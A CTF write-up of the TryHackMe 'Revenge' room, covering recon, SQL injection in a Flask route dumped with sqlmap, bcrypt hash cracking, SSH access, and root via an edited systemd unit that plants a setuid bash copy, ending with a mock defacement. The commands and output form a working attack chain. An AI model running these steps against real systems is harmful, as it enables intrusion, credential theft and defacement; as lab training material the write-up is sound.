---
title: THM - Revenge
description: write-up for the ducky room in thm
author: z3nn
date: 2020-10-19 22:17:34 +0300
categories: [Hacking, TryHackMe]
tags: [security,  sqlmap,  real-world,  enumeration,  ctf,  hacking,  tryhackme,  linux]
---

# THM - Revenge
A write-up to the Revenge machine provided by [TryHackMe](https://tryhackme.com/). This machine is rated as a `Medium` difficulty.... Let's get to it.

# Recon

A quick `nmap` scan revealed only 2 open ports and not much else... I don't remember the last time I had to brute force my way in via SSH on a CTF machine so most likely our way in is via port `80`
```
# Nmap 7.80 scan initiated Mon Oct 19 21:40:13 2020 as: nmap -sS -sV -A -Pn -p- -T5 -Pn --script=default,vuln -oA ducky 10.10.17.246
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Warning: 10.10.17.246 giving up on port because retransmission cap hit (2).
Nmap scan report for 10-10-17-246.rdsnet.ro (10.10.17.246)
Host is up (0.055s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey: 
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	CVE-2019-16905	4.4	https://vulners.com/cve/CVE-2019-16905
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|_    	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Home | Rubber Ducky Inc.
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   46.44 ms 10.11.0.1
2   60.09 ms 10-10-17-246.rdsnet.ro (10.10.17.246)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 19 21:47:06 2020 -- 1 IP address (1 host up) scanned in 412.98 seconds
```

Looking around the web app there's not much to it... the `/login` and `/admin` login forms don't do anything... Not much happening around here, just alot of rubber ducks.

`Gobuster` reveals a few interesting things
```
gobuster dir --url http://10.10.17.246/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,py,php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.17.246/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,py,php
[+] Timeout:        10s
===============================================================
2020/10/19 22:16:57 Starting gobuster
===============================================================
/static (Status: 301)
/app.py (Status: 200)
/requirements.txt (Status: 200)
```

There's an `app.py` and a `requirements.txt` file, if we try to go to that link `http://10.10.17.246/app.py` we get the download prompt and receive a Flask application. Upon further investigation of the application we can find the following vulnerability:
```python
...
# Product Route
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)
...
```

The `/products/<product_id>` path is vulnerable to SQL injection... come to think of it, this room had a `sqlmap` tag on it... figures!

Now we have to run `sqlmap` a few times to get some info:

## Check for injection vulnerability
```
$ sqlmap -u http://10.10.17.246/products/1 --batch
[21:52:20] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
---
[21:52:20] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[21:52:21] [WARNING] HTTP error codes detected during run:
405 (Method Not Allowed) - 1 times, 500 (Internal Server Error) - 80 times

```

## Get the databases
```
$ sqlmap -u http://10.10.17.246/products/1 --batch --dbs

---
[21:52:29] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[21:52:29] [INFO] fetching database names
[21:52:29] [INFO] retrieved: 'information_schema'
[21:52:29] [INFO] retrieved: 'duckyinc'
[21:52:29] [INFO] retrieved: 'mysql'
[21:52:29] [INFO] retrieved: 'performance_schema'
[21:52:30] [INFO] retrieved: 'sys'
```

## Get tables of a database
```
$ sqlmap -u http://10.10.17.246/products/1 --batch -D duckyinc --tables
---
[21:52:46] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[21:52:46] [INFO] fetching tables for database: 'duckyinc'
[21:52:46] [INFO] retrieved: 'product'
[21:52:46] [INFO] retrieved: 'system_user'
[21:52:46] [INFO] retrieved: 'user'

```

## Dump table contents
```
$ sqlmap -u http://10.10.17.246/products/1 --batch -D duckyinc --dump
---
Database: duckyinc                                                                                                                                                                                                                                          
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+
---
```

> There are 3 tables in total as seen above, I skiped writing the ones we don't need here.
> Also, the first flag is in one of the other tables... good luck.

## Crack away

Looking at the password hashes we can see a difference between server-admin and the other ones, server-admin:`$2a$08$` vs others`$2a$12$` ... now if you want to look it up, that 2nd number is the cost factor, 2 to the power of `X` iterations, where `X` is the cost factor... Now I didn't know this ~~shit~~, I researched it after... but...

I guess here I might've been pretty lucky as my first choice was to go for cracking the `server-admin` password and it worked like a charm. 

# Foothold
Now that we've got a username and password it's time to ssh into this machine, `ssh server-admin@10.10.17.246` and just like that we get our 2nd flag.

# PrivEsc
One of the first thing I do when I get a foothold on a linux machine __and__ I know the user's password is run `sudo -l`.
```
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

Well that looks nice, the moment I see stuff like this I pretty much know I'm in for some easy PrivEsc.

## Step 1
Looking at `/etc/systemd/system/duckyinc.service` we can see there's a few Exec's defined which we might be able to take advantage of, since we're going to run `/bin/systemctl` as root.
```
server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service 
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=flask-app
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

## Step 2
We need to create a script that will help us elevate our access.
> Chmod 4755 (chmod a+rwx,g-w,o-w,ug+s,+t,g-s,-t) sets permissions so that, (U)ser / owner can read, can write and can execute. (G)roup can read, can't write and can execute. (O)thers can read, can't write and can execute.

```
server-admin@duckyinc:~$ cat adminplox.sh 
#!/bin/bash
cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
server-admin@duckyinc:~$ chmod +x adminplox.sh
```

## Step 3
Update `/etc/systemd/system/duckyinc.service` so that it will execute our script.

```
server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service 
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /home/server-admin/adminplox.sh 
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

>Don't forget to change the User and Group values to `root` or else you'll end up with a `flask:www-data` shell.

## Step 4
Execute the `/bin/systemctl` commands available to us as sudo, then run the `shell` we have in `/tmp` with `-p` option

```
server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
server-admin@duckyinc:~$ sudo /bin/systemctl enable duckyinc.service
server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
server-admin@duckyinc:~$ ls -la /tmp
total 1124
drwxrwxrwt  9 root root    4096 Oct 19 20:01 .
drwxr-xr-x 24 root root    4096 Aug  9 15:17 ..
-rwsr-xr-x  1 root root 1113504 Oct 19 20:01 bash
drwxrwxrwt  2 root root    4096 Oct 19 19:59 .font-unix
drwxrwxrwt  2 root root    4096 Oct 19 19:59 .ICE-unix
drwx------  3 root root    4096 Oct 19 19:59 systemd-private-89c294b1e88d467cbaf80b86775f6531-systemd-resolved.service-EG7iwK
drwx------  3 root root    4096 Oct 19 19:59 systemd-private-89c294b1e88d467cbaf80b86775f6531-systemd-timesyncd.service-hCnhfo
drwxrwxrwt  2 root root    4096 Oct 19 19:59 .Test-unix
drwxrwxrwt  2 root root    4096 Oct 19 19:59 .X11-unix
drwxrwxrwt  2 root root    4096 Oct 19 19:59 .XIM-unix
server-admin@duckyinc:~$ cd /tmp
server-admin@duckyinc:/tmp$ ./bash -p
bash-4.4# whoami
root
```

We are now root... and it's not yet over...

```
bash-4.4# cd /root
bash-4.4# ls -la
total 52
drwx------  7 root root 4096 Aug 28 03:10 .
drwxr-xr-x 24 root root 4096 Aug  9 15:17 ..
drwxr-xr-x  2 root root 4096 Aug 12 18:46 .bash_completion.d
lrwxrwxrwx  1 root root    9 Aug 10 12:54 .bash_history -> /dev/null
-rw-r--r--  1 root root 3227 Aug 12 18:46 .bashrc
drwx------  3 root root 4096 Aug  9 16:15 .cache
drwx------  3 root root 4096 Aug  9 15:31 .gnupg
drwxr-xr-x  5 root root 4096 Aug 12 18:44 .local
-rw-------  1 root root  485 Aug 10 00:44 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Aug 10 13:21 .selected_editor
drwx------  2 root root 4096 Aug  9 15:29 .ssh
-rw-------  1 root root 7763 Aug 12 18:57 .viminfo
```

There's no flag in `/root` ... so I went to THM room to check that last hint, see what I actually missed and it said: `Mission objectives` ... Our `mission` was to deface the front page... so let's do that.


```
bash-4.4# mv /var/www/duckyinc/templates/index.html /tmp/
bash-4.4# ls -la
total 56
drwx------  7 root root 4096 Oct 19 20:04 .
drwxr-xr-x 24 root root 4096 Aug  9 15:17 ..
drwxr-xr-x  2 root root 4096 Aug 12 18:46 .bash_completion.d
lrwxrwxrwx  1 root root    9 Aug 10 12:54 .bash_history -> /dev/null
-rw-r--r--  1 root root 3227 Aug 12 18:46 .bashrc
drwx------  3 root root 4096 Aug  9 16:15 .cache
-rw-r--r--  1 root root   26 Oct 19 20:04 flag3.txt
drwx------  3 root root 4096 Aug  9 15:31 .gnupg
drwxr-xr-x  5 root root 4096 Aug 12 18:44 .local
-rw-------  1 root root  485 Aug 10 00:44 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Aug 10 13:21 .selected_editor
drwx------  2 root root 4096 Aug  9 15:29 .ssh
-rw-------  1 root root 7763 Aug 12 18:57 .viminfo
```

After we move `index.html` out of it's location, we can see a `flag3.txt` pop in `/root`.

Get the flag and GTFO!